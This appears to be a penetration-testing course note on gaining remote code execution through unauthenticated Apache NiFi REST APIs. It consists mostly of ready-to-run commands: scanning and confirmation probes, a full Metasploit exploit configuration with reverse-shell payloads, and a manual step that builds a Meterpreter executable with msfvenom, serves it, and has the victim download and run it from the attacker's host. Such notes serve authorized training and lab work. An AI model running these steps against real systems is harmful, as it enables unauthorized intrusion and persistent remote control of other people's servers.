# Apache NiFi

Java-based data flow automation tool common in enterprise data pipelines. Older unauthenticated instances expose a REST API that allows arbitrary OS command execution via the `ExecuteProcess` processor, no CVE, just a feature abuse.

Cross-link: [[The Metasploit Framework#21.4.1 Resource Scripts|Module 21 §21.4 Capstone]]

---

## What problem it solves (for the attacker)

NiFi lets admins build visual data flows by chaining processors that perform actions. HTTP fetches, file transforms, script execution. One built-in processor is `ExecuteProcess`, which runs any OS command on the NiFi host. In versions without authentication enforced (default before 1.14), the REST API is fully open. Any unauthenticated caller can create, configure, start, and delete processors via HTTP, which means arbitrary code execution.

## Identification

```bash
# nmap will report Jetty as the HTTP server; title shows "NiFi"
sudo nmap -sV -p 8080,9443 <target>
# Output: "Jetty 9.x.x / http-title: NiFi"

# Confirm unauthenticated access:
curl -s http://<target>:8080/nifi-api/system-diagnostics | jq .
# Returns JSON with uptime, heap usage etc. If auth required, returns 401.

# MSF scanner:
use auxiliary/scanner/http/apache_nifi_version
set RHOSTS <target>
set RPORT 8080
set SSL false
run
```

## Metasploit Exploit

```bash
use exploit/multi/http/apache_nifi_processor_rce

# Required settings:
set RHOSTS <target>
set RPORT 8080
set SSL false          # CRITICAL — module defaults to SSL; plain HTTP instances need this
set DELAY 20           # seconds before stopping/deleting processor; increase if stage times out

# Target selection:
set target 1           # "Windows (In-Memory)" — default is 0 (Unix)

# Payload selection for Windows:
# The module arch is "cmd" — it runs an OS command, not a binary.
# Binary payloads (windows/x64/meterpreter/reverse_tcp) are INCOMPATIBLE.
# Use a cmd-based payload:
set payload cmd/windows/powershell_reverse_tcp   # gives a PS session
# or for Meterpreter in one shot:
set payload cmd/windows/http/x64/meterpreter/reverse_tcp   # HTTP fetch + Meterpreter stage

set LHOST <kali-ip>
set LPORT 4444
run
```

## Key Gotchas

| Issue | Cause | Fix |
|---|---|---|
| `SSL_connect wrong version number` | Module trying HTTPS against plain HTTP port | `set SSL false` |
| `Exploit failed [bad-config]` with binary payload | Module arch is `cmd`, not `x86`/`x64` — binary payloads rejected | Use `cmd/windows/...` payload family |
| Stage sent but no session (DELAY=5) | NiFi deletes the processor (and its spawned process) before Meterpreter fully initialises | `set DELAY 20` |
| PowerShell shellcode payload not connecting | Encoded PS command too long / execution policy | Fall back to `cmd/windows/powershell_reverse_tcp` for a plain PS shell, then upgrade manually |

## Manual Upgrade to Meterpreter (from PS shell)

If the exploit gives a plain PowerShell session rather than Meterpreter:

```bash
# 1. Generate met.exe on Kali
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali> LPORT=4444 -f exe -o /tmp/met.exe

# 2. Serve it
python3 -m http.server 8888 -d /tmp/

# 3. Set up handler (in MSF, background the PS session first with Ctrl+Z)
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <kali>
set LPORT 4444
run -j

# 4. In the PS session:
sessions -i 1
iwr http://<kali>:8888/met.exe -OutFile C:\Windows\Temp\met.exe; C:\Windows\Temp\met.exe

# 5. Background PS session (Ctrl+Z), interact with new Meterpreter session
sessions -i 2
```

## Versions and Auth History

| Version range | Default auth |
|---|---|
| < 1.14 | None — REST API fully open |
| 1.14 — 1.15 | Single-user mode introduced but optional |
| >= 1.16 | Auth enforced by default; module can still work if `USERNAME`/`PASSWORD` set |

## vs Other Enterprise RCE Entry Points

| Target | Protocol | Auth? | MSF module |
|---|---|---|---|
| Apache NiFi | HTTP REST | Often none | `multi/http/apache_nifi_processor_rce` |
| Apache 2.4.49 | HTTP | None | `multi/http/apache_normalize_path_rce` |
| Atlassian Confluence | HTTP | Sometimes | `multi/http/atlassian_confluence_rce` |
| Jenkins | HTTP | Sometimes | `multi/http/jenkins_script_console` |

#### Tags: #ModernTooling #ApacheNiFi #RCE #Metasploit #UnauthenticatedAPI #DataPipeline #Module21
